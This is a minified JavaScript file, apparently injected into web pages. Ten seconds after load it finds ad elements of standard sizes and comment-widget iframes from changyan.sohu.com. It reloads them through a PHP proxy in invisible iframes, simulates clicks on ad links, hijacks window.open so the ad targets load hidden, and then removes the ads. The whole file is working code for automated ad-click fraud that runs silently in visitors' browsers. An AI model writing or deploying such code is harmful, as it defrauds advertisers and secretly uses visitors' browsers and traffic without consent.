!function(){window.$||(window.$=window.jQuery);var n=function(n,t){var e=document.createEvent("HTMLEvents");e.initEvent(t,!0,!0),n.dispatchEvent(e),$(n).trigger(t)},t=function(n){return!n||0===n.indexOf("javascript:")},e={},i={},r=function(n,t,e){var i=$("html");return e&&(i=$(e).contents()),i.find("a#res0,img,iframe,embed,object").filter(function(e,i){var r=$(i);return r.width()==n&&r.height()==t})},o=function(n,t,e,i){var r=$("html");return i&&(r=$(i).contents()),r.find("iframe").filter(function(i,r){var o=$(r),a=$(r).attr("src");return!!(a&&a.indexOf(n)>-1&&a.indexOf(n)<9&&o.width()==t&&o.height()==e)})},a=function(n,t,r){void 0!=t&&void 0!=r||(t=i.width,r=i.height);var o=$("<iframe height=0 width=0 />");$("body").append(o),o.on("load",function(n){if($(this).remove(),$(".iframe-ads-"+t+"-"+r).remove(),e[t+"*"+r]){for(var i=e[t+"*"+r],o=0;o<i.length;o++)"BODY"===i[o].parent().tagName?i[o].remove():i[o].parent().remove();e[t+"*"+r]=[]}}),o.get(0).src=n},c=function(n,t,e){var i=$('<iframe class="iframe-ads-'+t+"-"+e+'" height=0 width=0 />');$("body").append(i),i.on("load",function(n){h(t,e,this)}),i.get(0).src="/PHPProxy/phpproxy.php?url="+encodeURIComponent(n)},h=function(o,d,f){var u=null;f&&f.contentWindow&&(u=f.contentWindow.open,f.contentWindow.open=a);var s=r(o,d,f);if(s.length<1)return!1;if("IFRAME"===s.get(0).tagName){var v=s.attr("src");!v||v.indexOf(location.host)>-1&&v.indexOf(location.host)<9?h(o,d,s.get(0)):(c(v,o,d),e[o+"*"+d]?e[o+"*"+d].push(s):e[o+"*"+d]=[s])}else{var g=null;if("A"===s.get(0).tagName&&(g=s),g||(g=s.siblings("a")),0===g.length&&(g=s.parents("a")),0===g.length&&(g=s.prev()),i={width:o,height:d},t(g.attr("href"))){var p=window.open;window.open=a,n(g.get(0),"click"),window.open=p}else a(g.attr("href"),o,d);e[o+"*"+d]?e[o+"*"+d].push(g):e[o+"*"+d]=[g]}return f&&f.contentWindow&&(f.contentWindow.open=u),!0},d=function(n,t,i,r,a,h){var d=o(n,t,i,h);if(d.length<1)return!1;var f=d.attr("src");return c(f,r,a),e[r+"*"+a]?e[r+"*"+a].push(d):e[r+"*"+a]=[d],!0};setTimeout(function(){h(300,250),h(728,90),d("changyan.sohu.com",650,320,728,90)},1e4)}();